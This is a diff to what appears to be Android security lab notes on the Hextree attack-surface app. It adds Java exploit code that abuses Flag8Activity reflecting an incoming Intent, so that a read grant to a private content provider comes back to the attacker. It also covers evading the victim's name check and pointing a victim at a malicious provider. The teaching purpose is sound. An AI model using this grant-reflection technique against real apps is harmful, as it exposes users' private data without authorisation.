@@ -894,6 +894,34 @@ public class Flag8Activity extends AppCompactActivity {
 }
 ```
 
+When the caller is "denied", `Flag8Activity` returns the incoming Intent as it is, including its data URI and flags. The grant is issued with the identity of the vulnerable app, so we can target any of its providers with `grantUriPermissions="true"`, even a non-exported one such as `io.hextree.flag33_2`:
+
+```java
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        ...
+        Intent intent = new Intent();
+        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity");
+        // Private provider URI + read grant: the victim will reflect both back to us
+        intent.setData(Uri.parse("content://io.hextree.flag33_2/flags"));
+        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        // startActivityForResult() is required: otherwise getCallingActivity() is null
+        startActivityForResult(intent, 1);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        // The returned Intent carries the grant: we can now query the private provider
+        dump(data.getData());
+    }
+}
+```
+
+> **Note**: our activity's class name must not contain `Hextree`, otherwise the victim takes the other branch and doesn't reflect the Intent.
+
 ### Vulnerability in consuming Content Providers
 
 Previously, we examined vulnerabilities on the "sending" side where apps insecurely expose content. Now, we shift our focus to the "receiving" side. A significant threat model exists where applications expect to consume data from an external Content Provider. If the receiving app trusts the structure or content of the returned data without validation, it can be exploited.
@@ -973,7 +1001,8 @@ public class MainActivity extends AppCompatActivity {
         ...
         Intent intent = new Intent();
         intent.setClassName("io.test", "io.test.MainActivity");
-        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        // Point the victim to our malicious provider
+        intent.setData(Uri.parse("content://com.example.myapplication.attack.provider/file.txt"));
         startActivity(intent);
     }
 }
